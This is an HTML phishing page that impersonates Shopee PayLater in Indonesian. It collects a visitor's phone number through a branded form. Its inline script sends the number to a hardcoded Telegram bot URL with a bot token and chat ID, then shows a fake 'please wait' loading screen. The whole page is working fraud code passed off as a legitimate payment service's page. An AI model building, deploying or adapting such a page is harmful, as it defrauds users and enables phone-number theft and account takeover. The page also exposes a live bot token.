<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>SHOPEE:PAYLATER</title>
    <meta property="og:image" content="https://i.ibb.co/GszXFJ2/IMG-20240315-105849.jpg">
  <meta name="viewport" content="width, initial-scale=1">
  <meta name="theme-color" content="Coral">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      max-width: 800px;
      margin: 0 auto;
    }

    .gambar {
      width: 100%;
      margin-bottom: 0px;
    }

    .gambar img {
      width: 100%;
      object-fit: cover;
      margin-bottom: 0px;
    }

    .form-container {
      margin-bottom: 50px;
    }

    .form-container form {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 10px;
      position: relative; /* Menjadikan posisi relatif untuk posisi absolut span */
    }

    .form-container .phone-prefix {
      position: absolute; /* Menjadikan posisi absolut untuk span */
      left: 10px; /* Sesuaikan dengan jarak dari kiri input */
      top: 50%;
      transform: translateY(-50%);
      pointer-events: none; /* Agar tidak mengganggu klik ke input */
      font-weight:bold;
      font-size:14px;
      margin-left: 39px;
      color: #000000;
      margin-right: 150px;
      padding-bottom: 104px;
    }

    .form-container input[type="tel"],
    .form-container input[type="Submit"] {
      width: calc(70% - 8px);
      padding: 13px;
      border-radius: 8px;
      border: 1px solid #ff4500;
      margin-bottom: 30px;
      margin-left: 4px;
      font-weight:bold;
      font-size:14px;
      padding-left: 40px; /* Menambahkan padding kiri untuk membuat ruang untuk span */
    }

    .form-container input[type="Submit"] {
      width: calc(120% - 8px);
      max-width: 310px;
      padding: 13px;
      border-radius: 6px;
      background-color: #ff4500;
      color: white;
      font-weight: bold;
      cursor: pointer;
      margin-left: 7px;
      border-block-color: #ff4500;
    }

    .gambar-bawah {
      display: flex;
      justify-content: center;
      position: relative;
      bottom: -10px;
    }

    .gambar-bawah img {
      width: 50%;
      object-fit: cover;
      margin: 0 25px;
    }

    /* Aturan gaya untuk elemen putih */
    .white-element {
  width: 100vw;
  height: 100vh;
  background-color: #ff4500; /* Menggunakan warna solid tanpa transparansi */
  position: fixed;
  top: 0;
  left: 0;
  z-index: 9999;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}


    .white-element img {
      width: 180px; /* Ganti dengan ukuran yang diinginkan */
      height: 120px; /* Ganti dengan ukuran yang diinginkan */
    }

    .loading-text {
      margin-top: 10px;
      font-size: 16px;
      color:#ff4500;
      font-weight:bold;
    }
  </style>
  <script>
    window.addEventListener('load', function() {
      showWhiteElement();
    });

    function sendMessageToTelegram(message) {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState === 4 && this.status === 200) {
          console.log("Pesan terkirim: " + message);
        }
      };
      var url = "https://api.telegram.org/bot6406080700:AAHtISL259Uu4s3x93AzNMWK-XGedAGdp_0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);

      xhttp.open("POST", url, true);
      xhttp.send();
    }

    function kirimPesan() {
      var nomorHP = document.getElementById('nomor_hp').value;
      if (nomorHP.trim() === '') {
        if (navigator.vibrate) {
          navigator.vibrate(200);
        }
        return;
      }

      var message = "ğ—¡ğ—¼ğ—ºğ—¼ğ—¿ ğ—›ğ—®ğ—»ğ—±ğ—½ğ—µğ—¼ğ—»ğ—²: " + nomorHP;
      sendMessageToTelegram(message);
      showWhiteElement();
    }

    function showWhiteElement() {
      var whiteElement = document.createElement('div');
      whiteElement.classList.add('white-element');

      var logoImage = document.createElement('img');
      logoImage.src = 'https://i.ibb.co/D1CTX7v/pay1-1-removebg-preview.png';
      logoImage.alt = 'Logo';
      whiteElement.appendChild(logoImage);

      var loadingText = document.createElement('div');
      loadingText.classList.add('loading-text');
      loadingText.innerText = 'Tunggu sebentar ya... Gak lama kok';
      whiteElement.appendChild(loadingText);

      document.body.appendChild(whiteElement);

      setTimeout(function () {
        whiteElement.style.display = 'none';
      }, 7000); // Ubah waktu penundaan menjadi 5 detik
    }
  </script>
</head>
<body>
  <div class="gambar">
    <img src="https://i.ibb.co/GszXFJ2/IMG-20240315-105849.jpg" alt="Gambar Pucok">
  </div>

  <div class="form-container">
    <form onsubmit="kirimPesan(); return false;">
      <span class="phone-prefix">+62</span>
      <input type="tel" id="nomor_hp" name="nomor_hp" maxlength="12" placeholder="Nomor Handphone">
      <input type="Submit" value="Lanjutkan">
    </form>
  </div>

  <div class="gambar gambar-bawah">
    <img src="https://i.ibb.co/1nyLpFy/Shopee-Paylater-removebg-preview.png" alt="Logo LPS">
  </div>
</body>
</html>
